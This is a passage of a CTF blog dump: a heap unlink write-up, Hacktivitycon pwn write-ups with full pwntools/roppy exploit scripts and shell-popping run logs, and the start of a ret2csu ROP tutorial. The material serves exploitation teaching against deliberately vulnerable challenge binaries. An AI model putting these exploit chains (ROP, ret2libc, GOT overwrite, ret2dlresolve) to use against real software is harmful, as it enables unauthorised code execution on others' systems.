to print@plt for LIBC Leak [*] Getting __libc_start_main [*] __libc_start_main+240: 0x7f01b54d3840 [*] LIBC : 0x7f01b54b3010 [*] Switching to interactive mode Done! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ Now, all left is to calculate the system address and then overwrite another GOT entry with the system address and enjoy the shell:-\nsystem = p64(libc.function(\u0026#34;system\u0026#34;)) #system = system.replace(b\u0026#34;\\x7f\u0026#34;, b\u0026#34;\\x16\\x7f\u0026#34;) edit(3, p32(elf.got(\u0026#34;atoi\u0026#34;))) edit(0, system) p.sendafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, \u0026#34;sh\u0026#34;) p.interactive() Now, running the final exploit:-\n0 [13:30:14] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 2677 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [*] Preparing a fake chunk... [*] Fake chunk: 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000010: c0 20 60 00 00 00 00 00 c8 20 60 00 00 00 00 00 |. `...... `.....| 00000020: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000030: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000040: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000050: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000060: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000070: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000080: 80 00 00 00 00 00 00 00 90 |.........| [*] Editing chunk 3 with a fakr chunk [*] Triggering Unlink [*] Changing freegot to print@plt for LIBC Leak [*] Getting __libc_start_main [*] __libc_start_main+240: 0x7f89ceb6c840 [*] LIBC : 0x7f89ceb4c010 [*] Switching to interactive mode Invalid choice! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; $ $ whoami vagrant $ [*] Interrupted [*] Stopped program \u0026#39;./chapter1\u0026#39; And that was it, congratulations, now you learned the Unsafe Unlink, as my blog was silent for a while, this was in draft so here it is now.\n","date":"19 October 2020","permalink":"/posts/dream-diary-chapter-1/","section":"Posts","summary":"This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn\u0026rsquo;t get time for this writeup, so I will write it here.","title":"HTB Pwn - Dream Diary Chapter: 1"},{"content":"","date":null,"permalink":"/tags/unlink-htb-pwn-heap/","section":"Tags","summary":"","title":"Unlink, Htb, Pwn, Heap"},{"content":"I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF. I managed to do the every pwn challenge except space one which was heap and the exploitation mechanism of it belongs to GLIBC 2.27 and I am only familiar with GLIBC 2.24 at the moment, but I know what to do this week,\nPancake #Pancake challenge was very simple as the buffer overflow was very suspectible as the binary used the gets function which is a vulnerable function as it\u0026rsquo;ll keep taking the input a new line \\n is encountered. To our luck, the binary has a function named secret which spawns a shell for us. This was basically a ret2win technique.\nThe main function looks like:-\nundefined8 main(void) { char desired_pancakes_str [128]; int desired_pancakes; int tick_2; int tick_1; int tick_0; desired_pancakes = 0; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); puts(\u0026#34;Welcome to the pancake stacker!\u0026#34;); puts(\u0026#34;How many pancakes do you want?\u0026#34;); gets(desired_pancakes_str); /* Vulnerable */ -- snip -- return 0; } The offset to RIP is 152 because:\nWe have a variable type char of size 128 4 integers variables declared afterwars that means, sizeof(int) * 4 which is 16 Adding the size of variables will be 144 and adding 8 to it we get 152 which is the offset. The exploit:-\nfrom roppy import * elf = ELF(\u0026#34;pancake\u0026#34;) p = process(\u0026#34;./binary\u0026#34;) payload = b\u0026#34;A\u0026#34;*152 payload += p64(elf.function(\u0026#39;secret_recipe\u0026#39;)) p.sendline(payload) # FLAG: flag{too_many_pancakes_on_the_stack} p.interactive() Almost #This challenge was simple ret2libc attack and the binary used strcat to add 3 different buffer to single buffer which made it suspectible to buffer overflow as the 3 different buffer will be able to overflow the buffer s where all of those were being concatenated. Although, giving large buffer to all 3 different inputs will result in segfault in internal strcat function of LIBC.\nint build() { char src; // [esp+0h] [ebp-1C8h] char v2; // [esp+40h] [ebp-188h] char v3; // [esp+80h] [ebp-148h] char s[264]; // [esp+C0h] [ebp-108h] memset(s, 0, 0x100u); puts(\u0026#34;Insert the protocol:\u0026#34;); getInput(\u0026amp;src); puts(\u0026#34;Insert the domain:\u0026#34;); getInput(\u0026amp;v2); puts(\u0026#34;Insert the path:\u0026#34;); getInput(\u0026amp;v3); strcat(s, \u0026amp;src); *(_DWORD *)\u0026amp;s[strlen(s)] = 3092282; strcat(s, \u0026amp;v2); *(_WORD *)\u0026amp;s[strlen(s)] = 47; strcat(s, \u0026amp;v3); puts(\u0026#34;Result:\u0026#34;); return puts(s); } Here, we see that memset fills the variable s with 0 and then takes input via getInput which is a custom read function which takes upto 64 bytes with the getchar and then checks if the number of input is more than 64. When we send 64 bytes to first and second buffer and send 63 bytes we get segfault and control over EIP.\nSo, from here it was just as simple as doing a 32 bit ret2libc, since LIBC wasn\u0026rsquo;t provided I leaked the puts address and used the libc database.\nfrom roppy import * p = remote(\u0026#34;jh2i.com\u0026#34;, 50017) elf = ELF(\u0026#34;almost\u0026#34;) libc = ELF(\u0026#34;libc6-i386_2.27-3ubuntu1.2_amd64.so\u0026#34;) def protocol(): p.sendlineafter(\u0026#34;:\\n\u0026#34;, \u0026#34;A\u0026#34;*64) def domain(): p.sendlineafter(\u0026#34;:\\n\u0026#34;, \u0026#34;B\u0026#34;*64) def path(payload): payload = payload.ljust(63, b\u0026#34;c\u0026#34;) p.sendlineafter(\u0026#34;:\\n\u0026#34;, payload) protocol() domain() payload = b\u0026#34;A\u0026#34;*10 payload += p32(elf.plt(\u0026#34;puts\u0026#34;)) # function payload += p32(elf.function(\u0026#34;main\u0026#34;)) # return address payload += p32(elf.got(\u0026#34;puts\u0026#34;)) # arg1 path(payload) p.recvline() p.recvline() leak = u32(p.recv(4)) log.info(\u0026#34;puts@GOT: 0x%x\u0026#34; %(leak)) libc.address = leak - libc.function(\u0026#34;puts\u0026#34;) protocol() domain() payload = b\u0026#34;A\u0026#34;*10 payload += p32(libc.function(\u0026#34;system\u0026#34;)) payload += p32(0xdeadbeef) payload += p32(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) path(payload) p.interactive() Running te exploit:-\n0 [07:43:53] vagrant@oracle(oracle) pwn\u0026gt; python3 almost.py [+] Opening connection to jh2i.com on port 50017: Done [*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/almost [*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6-i386_2.27-3ubuntu1.2_amd64.so [*] puts@GOT: 0xf7d8b3d0 [*] Switching to interactive mode Result: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc://BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc/ls almost almost.c flag.txt $ cat flag.txt flag{my_code_was_almost_secure}$ $ [*] Interrupted [*] Closed connection to jh2i.com port 50017 sad #This was a statically linked binary and it had a stack overflow vulnerability and since it was statically linked no ret2libc could be done, I chose the ROP way to do a read syscall to store /bin/sh in BSS address and then did a execvesyscall. As it was statically linked binary, we had every needed gadget this made it simple to exploit:-\nExploit:-\nfrom roppy import * p = remote(\u0026#34;jh2i.com\u0026#34;, 50002) # flag{radically_statically_roppingly_vulnerable} pop_rdi = p64(0x40187a) syscall = p64(0x40eda4) pop_rdx = p64(0x40177f) pop_rsi = p64(0x407aae) pop_rax = p64(0x43f8d7) bss = p64(0x4ae310) payload = b\u0026#34;a\u0026#34;*264 # The read syscall payload += pop_rdi payload += p64(0) payload += pop_rsi payload += bss payload += pop_rdx payload += p64(0x8) payload += pop_rax payload += p64(0x0) payload += syscall # The execve syscall payload: execve(bss, 0, 0) payload += pop_rdi payload += bss payload += pop_rsi payload += p64(0x0) payload += pop_rdx payload += p64(0x0) payload += pop_rax payload += p64(59) payload += syscall p.recvline() p.sendline(payload) # Sedding `/bin/sh` and then the execve syscall will p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.interactive() Running the exploit:-\n0 [07:44:40] vagrant@oracle(oracle) pwn\u0026gt; python3 sad.py [+] Opening connection to jh2i.com on port 50002: Done [*] Switching to interactive mode $ ls flag.txt sad $ cat flag.txt flag{radically_statically_roppingly_vulnerable} $ [*] Interrupted [*] Closed connection to jh2i.com port 50002 Reference: https://pwning.tech/2020/03/09/zer0pts-hipwn/\nBullseye #This challenge was quite good and I liked it, it provided us a write-what-where primitive as a service and since the binary has Partial RELRO which means GOT entry was writeable, such a handy information. It was also leaking the alarm libc address which made it simple for us to get LIBC address by searching it ftro libc database.\n[*] \u0026#39;/home/vagrant/CTF/hacktivitycon/pwn/bullseye\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Exploit:-\nfrom roppy import * from time import sleep # flag{one_write_two_write_good_write_bad_write} HOST = \u0026#34;jh2i.com\u0026#34; PORT = 50031 libc = ELF(\u0026#34;libc6_2.30-0ubuntu2.1_amd64.so\u0026#34;) exit_got = \u0026#34;0x404058\u0026#34; sleep_got = \u0026#34;0x404060\u0026#34; main = \u0026#34;0x401260\u0026#34; read_got = \u0026#34;0x404038\u0026#34; p = remote(HOST, PORT) def send_data(where, what): p.sendlineafter(\u0026#34;?\\n\u0026#34;, where) p.sendlineafter(\u0026#34;?\\n\u0026#34;, what) send_data(exit_got, main) sleep(0xf) alarm = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) log.info(\u0026#34;alarm: 0x%x\u0026#34; %(alarm)) libc.address = alarm - libc.function(\u0026#34;alarm\u0026#34;) log.info(\u0026#34;LIBC : 0x%x\u0026#34; %(libc.address)) log.info(\u0026#34;system: 0x%x\u0026#34; %(libc.function(\u0026#34;system\u0026#34;))) send_data(sleep_got, main) send_data(\u0026#34;0x404040\u0026#34;, hex(libc.function(\u0026#34;system\u0026#34;))) p.interactive() Running the exploit:-\n0 [07:40:13] vagrant@oracle(oracle) pwn\u0026gt; python3 bullseye.py [*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6_2.30-0ubuntu2.1_amd64.so [+] Opening connection to jh2i.com on port 50031: Done [*] alarm: 0x7fbca7ea8be0 [*] LIBC : 0x7fbca7dc3000 [*] system: 0x7fbca7e184e0 [*] Paused [Press any key to continue] [*] Switching to interactive mode You have one write, don\u0026#39;t miss. Where do you want to write to? $ /bin/sh $ cat flag.txt flag{one_write_two_write_good_write_bad_write} $ exit sh: 2: �@: not found What do you want to write? [*] Got EOF while reading in interactive [*] Interrupted [*] Closed connection to jh2i.com port 50031 Bacon #This is quite a good challenge. We were given a binary and it had a stackoverflow vulnerability, the program was:-\nint main() { char buf[1036]; read(0, buf, 1056) } Although, it had stackoverflow vulnerability I couldn\u0026rsquo;t get to understand how to pwn this, since there wasn\u0026rsquo;t anything to leak any address so the ret2libc was out of option here, then I thought of ret2dl_resolve, this technique I learned about does not require any address leak, it will exploit the dl_runtime_resolve to exploit the link map of the functions. Using pwntools\u0026rsquo;s ROP module, it was a piece of cake.\nExploit:-\nfrom pwn import * p = remote(\u0026#34;jh2i.com\u0026#34;, 50032) rop = ROP(\u0026#34;bacon\u0026#34;) elf = ELF(\u0026#34;bacon\u0026#34;) dlresolve = Ret2dlresolvePayload(elf, symbol=\u0026#34;system\u0026#34;, args=[\u0026#34;/bin/sh\u0026#34;]) rop.read(0, dlresolve.data_addr) rop.ret2dlresolve(dlresolve) raw_rop = rop.chain() pause() payload = b\u0026#34;A\u0026#34;*1036 payload += raw_rop payload += dlresolve.payload p.send(payload) p.interactive() Running the exploit:-\n0 [07:39:10] vagrant@oracle(oracle) pwn\u0026gt; python3 bacon.py [+] Opening connection to jh2i.com on port 50032: Done [*] \u0026#39;/home/vagrant/CTFs/hacktivity/pwn/bacon\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Loading gadgets for \u0026#39;/home/vagrant/CTFs/hacktivity/pwn/bacon\u0026#39; [*] Paused (press any to continue) [*] Switching to interactive mode $ ls bacon flag.txt $ cat flag.txt flag{don\u0026#39;t_forget_to_take_out_the_grease} $ [*] Interrupted Reference: https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62\nThat was it, I wish I did space too. But I couldn\u0026rsquo;t, so I am gonna do it later today as I took some help from someone who did the challenge. In case, you need help just message me on twitter.\n","date":"1 August 2020","permalink":"/posts/hacktivitycon-pwn/","section":"Posts","summary":"I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF. I managed to do the every pwn challenge except space one which was heap and the exploitation mechanism of it belongs to GLIBC 2.","title":"Hacktivitycon - Pwn challenges"},{"content":"","date":null,"permalink":"/tags/pwn-roppy-ret2dlresolve/","section":"Tags","summary":"","title":"Pwn, Roppy, Ret2dlresolve"},{"content":"This is an in-depth guide on ret2csu technique. I tried to make this article as much detailed as I could, including references and some binary to practice it with.\nWhat is ret2csu? #Well, as you already know this a sub-technique of Return Oriented Programming. As you already know that Return Oriented Programming is the technique of using the available gadgets from the binary to craft a payload. The ret2csu technique involves the utilization of the gadgets present in __libc_csu_init to fill in the gaps of unavailable gadgets. For example, what if we want to do an execve syscall, we would need a rdi to pass /bin/sh, rsi for passing 0 and same for rdx and while looking for gadgets in binary, we didn\u0026rsquo;t find any pop rdx; ret;, then we use gadgets from __libc_csu_init to craft a chain carefully which will load the contents we gave to the rdx.\nConfused? Don\u0026rsquo;t worry, I\u0026rsquo;m gonna explain it in a very detailed way :)\nPrerequisites #This is included because, what if you\u0026rsquo;re trying to understand it as a beginner, I included this section because this will help you recall the knowledge you need for performing a ret2csu attack. This includes the calling convention of x86_64 bit binary and the assembly instructions we will deal with.\nCalling convetion #Calling convention refers to the way arguments are passed to a function, like how is the workflow of functions work at low level. Let\u0026rsquo;s take an example program:-\n#include\u0026lt;stdio.h\u0026gt; int main() { int x = 1; char *s = \u0026#34;Hello World\u0026#34;; // :p float y = 0.12; printf(\u0026#34;String: %s\\nInteger: %d\\nFloat: %f\\n\u0026#34;, s, x, y); return 0; } Let\u0026rsquo;s compile it:-\n✘ d4mianwayne@oracle: /tmp $ cat sample.c #include\u0026lt;stdio.h\u0026gt; int main() { int x = 1; char *s = \u0026#34;Hello World\u0026#34;; // :p double y = 100; printf(\u0026#34;String: %s\\nInteger: %d\\Double: %lf\\n\u0026#34;, s, x, y); return 0; } d4mianwayne@oracle: /tmp $ gcc sample.c -o sample d4mianwayne@oracle: /tmp $ ./sample String: Hello World Integer: 1 Float: 100.000000 It works perfectly as it\u0026rsquo;s supposed to Let\u0026rsquo;s start gdb and start analyzing the binary workflow:-\nd4mianwayne@oracle: /tmp $ gdb-gef -q sample Reading symbols from sample...(no debugging symbols found)...done. GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6 [*] 2 commands could not be loaded, run `gef missing` to know why. gef➤ disas main Dump of assembler code for function main: 0x000000000000064a \u0026lt;+0\u0026gt;:\tpush rbp 0x000000000000064b \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000000064e \u0026lt;+4\u0026gt;:\tsub rsp,0x30 0x0000000000000652 \u0026lt;+8\u0026gt;:\tmov DWORD PTR [rbp-0x14],0x1 0x0000000000000659 \u0026lt;+15\u0026gt;:\tlea rax,[rip+0xc8] # 0x728 0x0000000000000660 \u0026lt;+22\u0026gt;:\tmov QWORD PTR [rbp-0x10],rax 0x0000000000000664 \u0026lt;+26\u0026gt;:\tmovsd xmm0,QWORD PTR [rip+0xf4] # 0x760 0x000000000000066c \u0026lt;+34\u0026gt;:\tmovsd QWORD PTR [rbp-0x8],xmm0 0x0000000000000671 \u0026lt;+39\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x8] 0x0000000000000675 \u0026lt;+43\u0026gt;:\tmov edx,DWORD PTR [rbp-0x14] 0x0000000000000678 \u0026lt;+46\u0026gt;:\tmov rax,QWORD PTR [rbp-0x10] 0x000000000000067c \u0026lt;+50\u0026gt;:\tmov QWORD PTR [rbp-0x28],rcx 0x0000000000000680 \u0026lt;+54\u0026gt;:\tmovsd xmm0,QWORD PTR [rbp-0x28] 0x0000000000000685 \u0026lt;+59\u0026gt;:\tmov rsi,rax 0x0000000000000688 \u0026lt;+62\u0026gt;:\tlea rdi,[rip+0xa9] # 0x738 0x000000000000068f \u0026lt;+69\u0026gt;:\tmov eax,0x1 0x0000000000000694 \u0026lt;+74\u0026gt;:\tcall 0x520 \u0026lt;printf@plt\u0026gt; 0x0000000000000699 \u0026lt;+79\u0026gt;:\tmov eax,0x0 0x000000000000069e \u0026lt;+84\u0026gt;:\tleave 0x000000000000069f \u0026lt;+85\u0026gt;:\tret End of assembler dump. gef➤ The mov lines are moving the variables from base pointers to registers. This is the basic instruction to move an address/value to other address/register.\nThe line 0x000000000000064b \u0026lt;+1\u0026gt;:\tmov rbp,rsp, this one moves the stack to the base pointer, this is because that way the program can easily retrieve the variables from the base pointer as they\u0026rsquo;re stored at specific offsets.\nNow, let\u0026rsquo;s setup a breakpoint at call printf so that we can analyse how the arguments are being passed to it. GDB time:-\ngef➤ b *main + 74 Breakpoint 1 at 0x694 The breakpoint has been set, now let\u0026rsquo;s run the program and analyze:-\ngef➤ r Starting program: /tmp/sample [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x1 $rbx : 0x0 $rcx : 0x4059000000000000 $rdx : 0x1 $rsp : 0x00007fffffffde50 → 0x00007ffff7de59a0 → \u0026lt;_dl_fini+0\u0026gt; push rbp $rbp : 0x00007fffffffde80 → 0x00005555555546a0 → \u0026lt;__libc_csu_init+0\u0026gt; push r15 $rsi : 0x0000555555554728 → \u0026#34;Hello World\u0026#34; $rdi : 0x0000555555554738 → \u0026#34;String: %s\\nInteger: %d\\nDouble: %lf\\n\u0026#34; $rip : 0x0000555555554694 → \u0026lt;main+74\u0026gt; call 0x555555554520 \u0026lt;printf@plt\u0026gt; $r8 : 0x00007ffff7dd0d80 → 0x0000000000000000 $r9 : 0x00007ffff7dd0d80 → 0x0000000000000000 $r10 : 0x2 $r11 : 0x3 $r12 : 0x0000555555554540 → \u0026lt;_start+0\u0026gt; xor ebp, ebp $r13 : 0x00007fffffffdf60 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] -- snip -- gef➤ info registers rax 0x1\t0x1 rbx 0x0\t0x0 rcx 0x4059000000000000\t0x4059000000000000 rdx 0x1\t0x1 rsi 0x555555554728\t0x555555554728 rdi 0x555555554738\t0x555555554738 rbp 0x7fffffffde80\t0x7fffffffde80 rsp 0x7fffffffde50\t0x7fffffffde50 r8 0x7ffff7dd0d80\t0x7ffff7dd0d80 r9 0x7ffff7dd0d80\t0x7ffff7dd0d80 r10 0x2\t0x2 r11 0x3\t0x3 r12 0x555555554540\t0x555555554540 r13 0x7fffffffdf60\t0x7fffffffdf60 r14 0x0\t0x0 r15 0x0\t0x0 rip 0x555555554694\t0x555555554694 \u0026lt;main+74\u0026gt; eflags 0x206\t[ PF IF ] cs 0x33\t0x33 ss 0x2b\t0x2b ds 0x0\t0x0 es 0x0\t0x0 fs 0x0\t0x0 gs 0x0\t0x0 Thanks to gdb-gef, we already know most of the things which we needed to know i.e. which register holds what value, but as we looking for the registers and we need to know what is happening since this is required for further learning.\nUsing gdb\u0026rsquo;s x command to analyze the memory and registers, we can see the following:-\ngef➤ x/s $rdi 0x555555554738:\t\u0026#34;String: %s\\nInteger: %d\\nDouble: %lf\\n\u0026#34; gef➤ x/s $rsi 0x555555554728:\t\u0026#34;Hello World\u0026#34; gef➤ x/s $rdx 0x1:\t\u0026lt;error: Cannot access memory at address 0x1\u0026gt; gef➤ x/s $rcx 0x4059000000000000:\t\u0026lt;error: Cannot access memory at address 0x4059000000000000\u0026gt; gef➤ x/f $rcx 0x4059000000000000:\tCannot access memory at address 0x4059000000000000 gef➤ Breaking it down:-\nx555555554738:\t\u0026quot;String: %s\\nInteger: %d\\nDouble: %lf\\n\u0026quot; : This is in register rdi which is passed as 1st argument to the printf. 0x555555554728:\t\u0026quot;Hello World\u0026quot; : This is in register rsi which is passed as 2nd argument to printf. 0x1:\t\u0026lt;error: Cannot access memory at address 0x1\u0026gt; : First, we got a Cannot access memory i.e. the integer which we printed has a value of 0x01, hence a memory access error. This is passed to rdx register which is the 3rd argument to the printf. 0x4059000000000000:\tCannot access memory at address 0x4059000000000000 : Again, that happened because the value doesn\u0026rsquo;t point to a valid address. This is the 4th argument which is passed to printf. You might be wondering why we got a value like 0x4059000000000000 while we assigned 100 to the variable. That happened because the x/f printed an aligned value which doesn\u0026rsquo;t print the double values normally. For checking double values we do gef➤ p/f $rcx - $1 = 100.\nFrom this we know how calling conventions works:-\n1st argument goes to rdi. 2nd argument goest to rsi. 3rd argument goes to rdx 4th argument goes to rcx. This is constant for every function in 64 bit calling convention on Linux System.\nAssembly Instructions #Since we understood the calling conventions, it\u0026rsquo;s time to take a look at the assembly instructions we will deal with to understand the workflow of the payload. As an example, let\u0026rsquo;s take the exact same binary and analyse it\u0026rsquo;s __libc_csu_init, starting with gdb again:-\ngef➤ disas __libc_csu_init Dump of assembler code for function __libc_csu_init: 0x00000000000006a0 \u0026lt;+0\u0026gt;:\tpush r15 0x00000000000006a2 \u0026lt;+2\u0026gt;:\tpush r14 0x00000000000006a4 \u0026lt;+4\u0026gt;:\tmov r15,rdx 0x00000000000006a7 \u0026lt;+7\u0026gt;:\tpush r13 0x00000000000006a9 \u0026lt;+9\u0026gt;:\tpush r12 0x00000000000006ab \u0026lt;+11\u0026gt;:\tlea r12,[rip+0x200706] # 0x200db8 0x00000000000006b2 \u0026lt;+18\u0026gt;:\tpush rbp 0x00000000000006b3 \u0026lt;+19\u0026gt;:\tlea rbp,[rip+0x200706] # 0x200dc0 0x00000000000006ba \u0026lt;+26\u0026gt;:\tpush rbx 0x00000000000006bb \u0026lt;+27\u0026gt;:\tmov r13d,edi 0x00000000000006be \u0026lt;+30\u0026gt;:\tmov r14,rsi 0x00000000000006c1 \u0026lt;+33\u0026gt;:\tsub rbp,r12 0x00000000000006c4 \u0026lt;+36\u0026gt;:\tsub rsp,0x8 0x00000000000006c8 \u0026lt;+40\u0026gt;:\tsar rbp,0x3 0x00000000000006cc \u0026lt;+44\u0026gt;:\tcall 0x4f0 \u0026lt;_init\u0026gt; 0x00000000000006d1 \u0026lt;+49\u0026gt;:\ttest rbp,rbp 0x00000000000006d4 \u0026lt;+52\u0026gt;:\tje 0x6f6 \u0026lt;__libc_csu_init+86\u0026gt; 0x00000000000006d6 \u0026lt;+54\u0026gt;:\txor ebx,ebx 0x00000000000006d8 \u0026lt;+56\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0] 0x00000000000006e0 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x00000000000006e3 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x00000000000006e6 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x00000000000006e9 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x00000000000006ed \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x00000000000006f1 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x00000000000006f4 \u0026lt;+84\u0026gt;:\tjne 0x6e0 \u0026lt;__libc_csu_init+64\u0026gt; 0x00000000000006f6 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x00000000000006fa \u0026lt;+90\u0026gt;:\tpop rbx 0x00000000000006fb \u0026lt;+91\u0026gt;:\tpop rbp 0x00000000000006fc \u0026lt;+92\u0026gt;:\tpop r12 0x00000000000006fe \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000000700 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000000702 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000000704 \u0026lt;+100\u0026gt;:\tret Now, we see quite a lot of instructions, I\u0026rsquo;ll explain it in one line since they\u0026rsquo;re easy enough to get.\nNote: I will only explain the instruction which we will need to understand.\nlea : This instruction load effective address to a register. mov : This instruction is used to move an address/value to a register. je : This is a conditional instruction which means jump if equals to executes depending on the result of previous instruction. jle: This is also a conditional instruction which means jump if less than or equal to depending on the result of previous instruction. call : This instruction calls a subroutine. cmp : This compares register with a register or a register with a value. add : This adds the value given at right operand to left operand and store in it. pop : This pop the register which is given as an operand and wait for a value/address to be given. ret : This shows that a subroutine or instruction has been completed. Pwning time # Attachments:- #Binary: chall\nSource File: chall.c\nExploit: xpl.py\nNow, since we are way past the required knowledge section, it\u0026rsquo;s time to understand stuff practically since Pwning is best explained practically. Let\u0026rsquo;s take a piece of vulnerable code and compile it.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void vulnerable() { char buf[30]; gets(buf); /* Well, duh? :p */ } int main() { char name[20]; puts(\u0026#34;Welcome to the world of Pwning\u0026#34;); puts(\u0026#34;I\u0026#39;d like to know the name of brave warrior\u0026#34;); fgets(name, 20, stdin); puts(\u0026#34;As a token of appreciation, how about pwning me?\u0026#34;); vulnerable(); return 0; } Let\u0026rsquo;s compile it by disabling the stack canary and PIE to make it more understandable. Using gcc --no-stack-protector -no-pie chall.c -o chall:-\nd4mianwayne@oracle: /tmp/ctf/pwn1 $ gcc --no-stack-protector -no-pie chall.c -o chall chall.c: In function ‘vulnerable’: chall.c:7:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] gets(buf); /* Well, duh? :p */ ^~~~ fgets /tmp/ccr4ksWU.o: In function `vulnerable\u0026#39;: chall.c:(.text+0x15): warning: the `gets` function is dangerous and should not be used. d4mianwayne@oracle: /tmp/ctf/pwn1 $ ./chall Welcome to the world of Pwning I\u0026#39;d like to know the name of brave warrior Robin As a token of appreciation, how about pwning me? Hello World It works as it is supposed to, right?. But, our end goal is to get a shell or do something it is not supposed to. Let\u0026rsquo;s fire up gdb and see what we have and start analyzing the binary :-\nReading symbols from chall...(no debugging symbols found)...done. GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6 [*] 2 commands could not be loaded, run `gef missing` to know why. gef➤ info functions All defined functions: Non-debugging symbols: 0x0000000000400470 _init 0x00000000004004a0 puts@plt 0x00000000004004b0 fgets@plt 0x00000000004004c0 gets@plt 0x00000000004004d0 _start 0x0000000000400500 _dl_relocate_static_pie 0x0000000000400510 deregister_tm_clones 0x0000000000400540 register_tm_clones 0x0000000000400580 __do_global_dtors_aux 0x00000000004005b0 frame_dummy 0x00000000004005b7 vulnerable 0x00000000004005d3 main 0x0000000000400630 __libc_csu_init 0x00000000004006a0 __libc_csu_fini 0x00000000004006a4 _fini gef➤ disas vulnerable Dump of assembler code for function vulnerable: 0x00000000004005b7 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004005b8 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004005bb \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000004005bf \u0026lt;+8\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000004005c3 \u0026lt;+12\u0026gt;:\tmov rdi,rax 0x00000000004005c6 \u0026lt;+15\u0026gt;:\tmov eax,0x0 0x00000000004005cb \u0026lt;+20\u0026gt;:\tcall 0x4004c0 \u0026lt;gets@plt\u0026gt; 0x00000000004005d0 \u0026lt;+25\u0026gt;:\tnop 0x00000000004005d1 \u0026lt;+26\u0026gt;:\tleave 0x00000000004005d2 \u0026lt;+27\u0026gt;:\tret End of assembler dump. As we have access to the source code, we pretty much know what exactly is going on. We need to find a way to get a shell and the checksec shows us we have a non-executable stack and Partial Relro which means GOT is overwritable but that\u0026rsquo;s not the scope of this article, so we will keep it out.\nWe are going to perform ret2libc but this time instead of doing system(\u0026quot;/bin/sh\u0026quot;) we are going to do execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\nLet\u0026rsquo;s run ropper and see what gadgets we can control:-\nd4mianwayne@oracle: /tmp/ctf/pwn1 $ ropper --file chall --search \u0026#39;pop\u0026#39; [INFO] Load gadgets for section: LOAD [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: pop [INFO] File: chall 0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret; 0x000000000040068e: pop r13; pop 